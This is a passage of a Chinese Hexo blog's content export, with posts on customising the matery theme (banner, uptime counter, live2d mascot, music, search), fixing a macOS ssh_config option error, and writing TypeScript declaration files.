图.  Switch banner image every day.</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.bg-cover'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'background-image'</span><span class="token punctuation">,</span> <span class="token string">'url(/medias/banner/'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.jpg)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果如下：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo16.png" alt></p><h3 id="添加建站时间"><a href="#添加建站时间" class="headerlink" title="添加建站时间"></a>添加建站时间</h3><p>修改<code>/themes/matery/layout/_partial/footer.ejs</code>文件，在最后加上</p><pre class="line-numbers language-html"><code class="language-html">&lt;script language = javascript ><span class="token script language-javascript">    <span class="token keyword">function</span> <span class="token function">siteTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        window<span class="token punctuation">.</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">"siteTime()"</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> seconds <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> minutes <span class="token operator">=</span> seconds <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> hours <span class="token operator">=</span> minutes <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> days <span class="token operator">=</span> hours <span class="token operator">*</span> <span class="token number">24</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> years <span class="token operator">=</span> days <span class="token operator">*</span> <span class="token number">365</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> today <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> todayYear <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">getFullYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> todayMonth <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">getMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> todayDate <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">getDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> todayHour <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">getHours</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> todayMinute <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">getMinutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> todaySecond <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">getSeconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> t1 <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">UTC</span><span class="token punctuation">(</span><span class="token number">2018</span><span class="token punctuation">,</span> <span class="token number">08</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">00</span><span class="token punctuation">,</span> <span class="token number">00</span><span class="token punctuation">,</span> <span class="token number">00</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//北京时间2018-2-13 00:00:00 </span>        <span class="token keyword">var</span> t2 <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">UTC</span><span class="token punctuation">(</span>todayYear<span class="token punctuation">,</span> todayMonth<span class="token punctuation">,</span> todayDate<span class="token punctuation">,</span> todayHour<span class="token punctuation">,</span> todayMinute<span class="token punctuation">,</span> todaySecond<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">var</span> diff <span class="token operator">=</span> t2 <span class="token operator">-</span> t1<span class="token punctuation">;</span> <span class="token keyword">var</span> diffYears <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>diff <span class="token operator">/</span> years<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">var</span> diffDays <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span>diff <span class="token operator">/</span> days<span class="token punctuation">)</span> <span class="token operator">-</span> diffYears <span class="token operator">*</span> <span class="token number">365</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">var</span> diffHours <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span>diff <span class="token operator">-</span> <span class="token punctuation">(</span>diffYears <span class="token operator">*</span> <span class="token number">365</span> <span class="token operator">+</span> diffDays<span class="token punctuation">)</span> <span class="token operator">*</span> days<span class="token punctuation">)</span> <span class="token operator">/</span> hours<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">var</span> diffMinutes <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span>diff <span class="token operator">-</span> <span class="token punctuation">(</span>diffYears <span class="token operator">*</span> <span class="token number">365</span> <span class="token operator">+</span> diffDays<span class="token punctuation">)</span> <span class="token operator">*</span> days <span class="token operator">-</span> diffHours <span class="token operator">*</span> hours<span class="token punctuation">)</span> <span class="token operator">/</span> minutes<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">var</span> diffSeconds <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span>diff <span class="token operator">-</span> <span class="token punctuation">(</span>diffYears <span class="token operator">*</span> <span class="token number">365</span> <span class="token operator">+</span> diffDays<span class="token punctuation">)</span> <span class="token operator">*</span> days <span class="token operator">-</span> diffHours <span class="token operator">*</span> hours <span class="token operator">-</span> diffMinutes <span class="token operator">*</span> minutes<span class="token punctuation">)</span> <span class="token operator">/</span> seconds<span class="token punctuation">)</span><span class="token punctuation">;</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"sitetime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"本站已运行 "</span> <span class="token operator">+</span>diffYears<span class="token operator">+</span><span class="token string">" 年 "</span><span class="token operator">+</span>diffDays <span class="token operator">+</span> <span class="token string">" 天 "</span> <span class="token operator">+</span> diffHours <span class="token operator">+</span> <span class="token string">" 小时 "</span> <span class="token operator">+</span> diffMinutes <span class="token operator">+</span> <span class="token string">" 分钟 "</span> <span class="token operator">+</span> diffSeconds <span class="token operator">+</span> <span class="token string">" 秒"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token function">siteTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在适当位置加上一下代码</p><pre><code>&lt;span id=&quot;sitetime&quot;&gt;&lt;/span&gt;</code></pre><p>如：</p><pre><code> &lt;div class=&quot;col s12 m8 l8 copy-right&quot;&gt;    &lt;span id=&quot;sitetime&quot;&gt;&lt;/span&gt; &lt;br&gt;    本站由&amp;copy;&lt;a href=&quot;https://gongchenghuigch.github.io/&quot; target=&quot;_blank&quot;&gt;gongchenghui&lt;/a&gt;基于    &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot;&gt;Hexo&lt;/a&gt; 的    &lt;a href=&quot;https://github.com/blinkfox/hexo-theme-matery&quot; target=&quot;_blank&quot;&gt;hexo-theme-matery&lt;/a&gt;主题搭建.</code></pre><h3 id="添加萌萌的动漫人物"><a href="#添加萌萌的动漫人物" class="headerlink" title="添加萌萌的动漫人物"></a>添加萌萌的动漫人物</h3><p>先看看添加卡通人物之后的效果：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo21.png" alt></p><p>😯😲</p><p>安装插件</p><pre class="line-numbers language-js"><code class="language-js">npm install <span class="token operator">--</span>save hexo<span class="token operator">-</span>helper<span class="token operator">-</span>live2d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装下载动画人物库 如：</p><pre><code>npm install live2d-widget-model-z16 -D</code></pre><p>根目录_config.yml配置里面添加：</p><pre class="line-numbers language-javascript"><code class="language-javascript">live2d<span class="token punctuation">:</span>   enable<span class="token punctuation">:</span> <span class="token boolean">true</span>   scriptFrom<span class="token punctuation">:</span> local   pluginRootPath<span class="token punctuation">:</span> live2dw<span class="token operator">/</span>   pluginJsPath<span class="token punctuation">:</span> lib<span class="token operator">/</span>   pluginModelPath<span class="token punctuation">:</span> assets<span class="token operator">/</span>   tagMode<span class="token punctuation">:</span> <span class="token boolean">false</span>   log<span class="token punctuation">:</span> <span class="token boolean">false</span>   model<span class="token punctuation">:</span>     use<span class="token punctuation">:</span> live2d<span class="token operator">-</span>widget<span class="token operator">-</span>model<span class="token operator">-</span>z16   display<span class="token punctuation">:</span>     position<span class="token punctuation">:</span> right     width<span class="token punctuation">:</span> <span class="token number">150</span>     height<span class="token punctuation">:</span> <span class="token number">300</span>   mobile<span class="token punctuation">:</span>     show<span class="token punctuation">:</span> <span class="token boolean">true</span>     react<span class="token punctuation">:</span>       opacity<span class="token punctuation">:</span> <span class="token number">0.7</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>动画库的样式示例：</p><p>Epsilon2.1<br><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/Epsilon2.1.gif" alt></p><p>Gantzert_Felixander：<br><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/Gantzert_Felixander.gif" alt></p><p>ni-j：<br><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/ni-j.gif" alt></p><p>nico：<br><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/nico.gif" alt></p><p>shizuku：<br><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/shizuku.gif" alt></p><p>z16：<br><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/z16.gif" alt></p><p>动漫人物只好不要和不蒜子一起使用，不然不蒜子会显示不出来。</p><h3 id="添加网易云音乐"><a href="#添加网易云音乐" class="headerlink" title="添加网易云音乐"></a>添加网易云音乐</h3><p>如何在文章里面插入音乐呢？  </p><p>打开网易云音乐网页版，找到你自己想听的音乐</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo22.png" alt></p><p>点击生成外链接：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo23.png" alt></p><p>然后把里面的HTML代码复制到你的文章里面就可以了。</p><h3 id="添加搜索"><a href="#添加搜索" class="headerlink" title="添加搜索"></a>添加搜索</h3><p>安装搜索插件：</p><pre class="line-numbers language-js"><code class="language-js">npm install hexo<span class="token operator">-</span>generator<span class="token operator">-</span>search <span class="token operator">--</span>save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根目录_config.yml配置：</p><pre><code>search:  path: search.xml  field: post</code></pre>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh报错</title>
      <link href="2019/09/06/ssherr/"/>
      <url>2019/09/06/ssherr/</url>
      
        <content type="html"><![CDATA[<h2 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h2><pre class="line-numbers language-js"><code class="language-js">➜  docSynopsis git<span class="token punctuation">:</span><span class="token punctuation">(</span>master<span class="token punctuation">)</span> git pull origin master<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_config<span class="token punctuation">:</span> line <span class="token number">20</span><span class="token punctuation">:</span> Bad configuration option<span class="token punctuation">:</span> gssapikeyexchange<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_config<span class="token punctuation">:</span> line <span class="token number">56</span><span class="token punctuation">:</span> Bad configuration option<span class="token punctuation">:</span> gssapitrustdns<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_config<span class="token punctuation">:</span> line <span class="token number">57</span><span class="token punctuation">:</span> Bad configuration option<span class="token punctuation">:</span> gssapikeyexchange<span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_config<span class="token punctuation">:</span> terminating<span class="token punctuation">,</span> <span class="token number">3</span> bad configuration optionsfatal<span class="token punctuation">:</span> Could not read <span class="token keyword">from</span> remote repository<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><blockquote><p>sudo vim /etc/ssh/ssh_config</p></blockquote><p>切换到报错行 直接注释</p><ul><li><p>You are running macOS Sierra (10.14)</p></li><li><p>You have a pre-existing <code>.ssh/config</code> or <code>/etc/ssh/ssh_config</code> file, possibly with a <code>GSSAPIKeyExchange no</code> setting that was previously required for El Capitan (Mac OS 10.11)</p></li><li><p>macOS Sierra中的ssh程序不再支持<code>GSSAPIKeyExchange</code>选项</p></li><li><p>删除或注释掉包含<code>GSSAPIKeyExchange的行</code></p></li></ul><p>重新生成ssh公钥</p><pre class="line-numbers language-markup"><code class="language-markup">ssh-keygen -t rsa -C "邮件地址"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ssh </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript声明文件</title>
      <link href="2019/09/05/tsinterface/"/>
      <url>2019/09/05/tsinterface/</url>
      
        <content type="html"><![CDATA[<h2 id="声明文件简介"><a href="#声明文件简介" class="headerlink" title="声明文件简介"></a>声明文件简介</h2><p>当使用第三方库时，我们需要引用它的声明文件，才能获得对应的代码补全、接口提示等功能。</p><h3 id="什么是声明语句"><a href="#什么是声明语句" class="headerlink" title="什么是声明语句"></a>什么是声明语句</h3><p>假如我们想使用第三方库 jQuery，一种常见的方式是在 html 中通过 <code>&lt;script&gt;</code> 标签引入 jQuery，然后就可以使用全局变量 <code>$</code> 或 <code>jQuery</code> 了。如：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是在 ts 中，编译器并不知道 <code>$</code> 或 <code>jQuery</code> 是什么东西:</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Cannot find name '$'. Do you need to install type definitions for jQuery? Try `npm i @types/jquery`.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时，我们需要使用 <code>declare var</code> 来定义它的类型:</p><pre class="line-numbers language-js"><code class="language-js">declare <span class="token keyword">var</span> $<span class="token punctuation">:</span> <span class="token punctuation">(</span>selector<span class="token punctuation">:</span> string<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> any<span class="token punctuation">;</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>declare var</code> 并没有真的定义一个变量，只是定义了全局变量 <code>$</code> 的类型，仅仅会用于编译时的检查，在编译结果中会被删除。</p><h3 id="什么是声明文件"><a href="#什么是声明文件" class="headerlink" title="什么是声明文件"></a>什么是声明文件</h3><p>通常我们会把声明语句放到一个单独的文件（<code>index.d.ts</code>）中，这就是声明文件：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">myInfoType</span> <span class="token punctuation">{</span>    name<span class="token operator">?</span><span class="token punctuation">:</span> string<span class="token punctuation">;</span>    age<span class="token operator">?</span><span class="token punctuation">:</span> number<span class="token punctuation">;</span>    <span class="token punctuation">[</span>params<span class="token punctuation">:</span>string<span class="token punctuation">]</span><span class="token punctuation">:</span> any<span class="token punctuation">;</span><span class="token punctuation">}</span>declare <span class="token keyword">const</span> myInfo<span class="token punctuation">:</span> myInfoType<span class="token punctuation">;</span>declare <span class="token keyword">const</span> $<span class="token punctuation">:</span> <span class="token punctuation">(</span>selector<span class="token punctuation">:</span> string<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> any<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>声明文件必须以.d.ts为后缀。  </p><p>ts 会解析项目中所有的 <code>*.ts</code> 文件，当然也包含以 <code>.d.ts</code> 结尾的文件。所以当我们将 <code>jQuery.d.ts</code> 放到项目中时，其他所有 <code>*.ts</code> 文件就都可以获得 <code>$</code> 的类型定义了。</p><pre class="line-numbers language-js"><code class="language-js">├── src # 业务资源文件目录│    ├── category <span class="token comment" spellcheck="true">//项目分类</span>│    │    ├── demo1│    │    ├── demo2│    │    └── <span class="token operator">...</span>│    ├── components <span class="token comment" spellcheck="true">//公共组件</span>│    ├── util <span class="token comment" spellcheck="true">//公共资源</span>│    └── custom<span class="token punctuation">.</span>d<span class="token punctuation">.</span>ts <span class="token comment" spellcheck="true">//项目全局变量声明文件</span>├── index<span class="token punctuation">.</span>html <span class="token comment" spellcheck="true">//项目启动入口</span>├── <span class="token punctuation">.</span>gitignore <span class="token comment" spellcheck="true">//git忽略文件</span>├── <span class="token punctuation">.</span>eslintrc<span class="token punctuation">.</span>js <span class="token comment" spellcheck="true">//eslint校验配置</span>├── <span class="token keyword">package</span><span class="token punctuation">.</span>json <span class="token comment" spellcheck="true">//依赖包</span>├── tsconfig<span class="token punctuation">.</span>json <span class="token comment" spellcheck="true">//ts配置</span>├── webpack<span class="token punctuation">.</span>config<span class="token punctuation">.</span>build<span class="token punctuation">.</span>js <span class="token comment" spellcheck="true">//webpack打包</span>├── webpack<span class="token punctuation">.</span>config<span class="token punctuation">.</span>base<span class="token punctuation">.</span>js <span class="token comment" spellcheck="true">//webpack基础配置</span>└── webpack<span class="token punctuation">.</span>config<span class="token punctuation">.</span>js <span class="token comment" spellcheck="true">//项目启动配置</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>假如仍然无法解析，那么可以检查下 <code>tsconfig.json</code> 中的 <code>files</code>、<code>include</code> 和 <code>exclude</code> 配置，确保其包含了 <code>index.d.ts</code> 文件。</p><p>也是就是说声明文件要代码使用的顶级目录下。</p><h3 id="第三方声明文件"><a href="#第三方声明文件" class="headerlink" title="第三方声明文件"></a>第三方声明文件</h3><p>我们可以直接下载下来使用，但是更推荐的是使用 <code>@types</code> 统一管理第三方库的声明文件。</p><p><code>@types</code> 的使用方式很简单，直接用 npm 安装对应的声明模块即可，以 jQuery 举例：</p><pre class="line-numbers language-js"><code class="language-js">npm install @types<span class="token operator">/</span>jquery <span class="token operator">--</span>save<span class="token operator">-</span>dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="书写声明文件"><a href="#书写声明文件" class="headerlink" title="书写声明文件"></a>书写声明文件</h2><p>在不同的场景下，声明文件的内容和使用方式会有所区别。</p><p>库的使用场景主要有以下几种：</p><ul><li><a href>全局变量</a>：通过 <code>&lt;script&gt;</code> 标签引入第三方库，注入全局变量</li><li><a href>npm 包</a>：通过 <code>import foo from &#39;foo&#39;</code> 导入，符合 ES6 模块规范</li><li><a href>UMD 库</a>：既可以通过 <code>&lt;script&gt;</code> 标签引入，又可以通过 <code>import</code> 导入</li><li><a href>直接扩展全局变量</a>：通过 <code>&lt;script&gt;</code> 标签引入后，改变一个全局变量的结构</li><li><a href>在 npm 包或 UMD 库中扩展全局变量</a>：引用 npm 包或 UMD 库后，改变一个全局变量的结构</li><li><a href>模块插件</a>：通过 <code>&lt;script&gt;</code> 或 <code>import</code> 导入后，改变另一个模块的结构</li></ul><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>使用全局变量的声明文件时，如果是以 <code>npm install @types/xxx --save-dev</code> 安装的，则不需要任何配置。否则就需要在声明文件中声明全局变量。</p><p>全局变量的声明文件主要有以下几种语法：</p><ul><li><a href>declare var/const/let</a> 声明全局变量</li><li><a href>declare function</a> 声明全局方法</li><li><a href>declare class</a> 声明全局类</li><li><a href>declare enum</a> 声明全局枚举类型</li><li><a href>declare namespace</a> 声明（含有子属性的）全局对象</li><li><a href>interface 和 type</a> 声明全局类型</li></ul><h3 id="declare-var-const-let"><a href="#declare-var-const-let" class="headerlink" title="declare var/const/let"></a>declare var/const/let</h3><p>用来定义一个全局变量的类型;</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">myInfoType</span> <span class="token punctuation">{</span>    name<span class="token operator">?</span><span class="token punctuation">:</span> string<span class="token punctuation">;</span>    age<span class="token operator">?</span><span class="token punctuation">:</span> number<span class="token punctuation">;</span>    <span class="token punctuation">[</span>params<span class="token punctuation">:</span>string<span class="token punctuation">]</span><span class="token punctuation">:</span> any<span class="token punctuation">;</span><span class="token punctuation">}</span>declare <span class="token keyword">var</span> myInfo<span class="token punctuation">:</span>myInfoType<span class="token punctuation">;</span>declare <span class="token keyword">let</span> myInfo<span class="token punctuation">:</span>myInfoType<span class="token punctuation">;</span>declare <span class="token keyword">const</span> myInfo<span class="token punctuation">:</span>myInfoType<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//此时全局变量是一个常量不允许修改</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般来说，全局变量都是禁止修改的常量，所以大部分情况都应该使用 <code>const</code> 而不是 <code>var</code> 或 <code>let</code>。</p><p>需要注意的是，声明语句中只能定义类型，切勿在声明语句中定义具体的实现</p><pre class="line-numbers language-js"><code class="language-js">declare <span class="token keyword">const</span> test <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>para<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> para<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//An implementation cannot be declared in ambient contexts.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="declare-function"><a href="#declare-function" class="headerlink" title="declare function"></a>declare function</h3><p><code>declare function</code> 用来定义全局函数的类型。</p><pre class="line-numbers language-js"><code class="language-js">declare <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span>para<span class="token punctuation">:</span> string<span class="token punctuation">)</span><span class="token punctuation">:</span>any<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>统一也是只能定义类型 不能定义具体实现；</p><pre class="line-numbers language-js"><code class="language-js">declare <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span>para<span class="token punctuation">:</span> string<span class="token punctuation">)</span><span class="token punctuation">:</span>any<span class="token punctuation">{</span>    <span class="token keyword">return</span> para<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//An implementation cannot be declared in ambient contexts.ts(1183)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="declare-class"><a href="#declare-class" class="headerlink" title="declare class"></a>declare class</h3><p>当全局变量是一个类的时候，我们用 <code>declare class</code> 来定义它的类型</p><pre class="line-numbers language-js"><code class="language-js">declare <span class="token keyword">class</span> <span class="token class-name">student</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> string<span class="token punctuation">;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">:</span> string<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样的，<code>declare class</code> 语句也只能用来定义类型，不能用来定义具体的实现，比如定义 hello` 方法的具体实现则会报错：</p><pre class="line-numbers language-js"><code class="language-js">declare <span class="token keyword">class</span> <span class="token class-name">student</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> string<span class="token punctuation">;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">:</span> string<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//An implementation cannot be declared in ambient contexts.ts(1183)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="declare-namespace"><a href="#declare-namespace" class="headerlink" title="declare namespace"></a>declare namespace</h3><p><code>namespace</code> 是 ts 早期时为了解决模块化而创造的关键字，中文称为命名空间。</p><p>随着 ES6 的广泛应用，现在已经不建议再使用 ts 中的 <code>namespace</code>，而推荐使用 ES6 的模块化方案了，故我们不再需要学习 <code>namespace</code> 的使用了。</p><p><code>namespace</code> 被淘汰了，但是在声明文件中，<code>declare namespace</code> 还是比较常用的，它用来表示全局变量是一个对象，包含很多子属性。</p><pre class="line-numbers language-js"><code class="language-js">declare namespace jQuery <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">ajax</span><span class="token punctuation">(</span>url<span class="token punctuation">:</span> string<span class="token punctuation">,</span> settings<span class="token operator">?</span><span class="token punctuation">:</span> any<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="interface-和-type"><a href="#interface-和-type" class="headerlink" title="interface 和 type"></a>interface 和 type</h3><p>除了全局变量之外，可能有一些类型我们也希望能暴露出来。在类型声明文件中，我们可以直接使用 <code>interface</code> 或 <code>type</code> 来声明一个全局的接口或类型</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">fetchOptions</span> <span class="token punctuation">{</span>    method<span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string">'GET'</span> <span class="token operator">|</span> <span class="token string">'POST'</span><span class="token punctuation">;</span>    credentials<span class="token operator">?</span><span class="token punctuation">:</span> string<span class="token punctuation">;</span>    headers<span class="token operator">?</span><span class="token punctuation">:</span> any<span class="token punctuation">;</span>    <span class="token punctuation">[</span>params<span class="token punctuation">:</span> string<span class="token punctuation">]</span><span class="token punctuation">:</span> any<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">let</span> options<span class="token punctuation">:</span> fetchOptions <span class="token operator">=</span> <span class="token punctuation">{</span>    method<span class="token punctuation">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>    credentials<span class="token punctuation">:</span> <span class="token string">'include'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="防止命名冲突"><a href="#防止命名冲突" class="headerlink" title="防止命名冲突"></a>防止命名冲突</h5><p>暴露在最外层的 <code>interface</code> 或 <code>type</code> 会作为全局类型作用于整个项目中，我们应该尽可能的减少全局变量或全局类型的数量。故最好将他们放到 <code>namespace</code> 下</p><pre class="line-numbers language-js"><code class="language-js">declare namespace fetchSetting <span class="token punctuation">{</span>    <span class="token keyword">interface</span> <span class="token class-name">fetchOptions</span> <span class="token punctuation">{</span>        method<span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string">'GET'</span> <span class="token 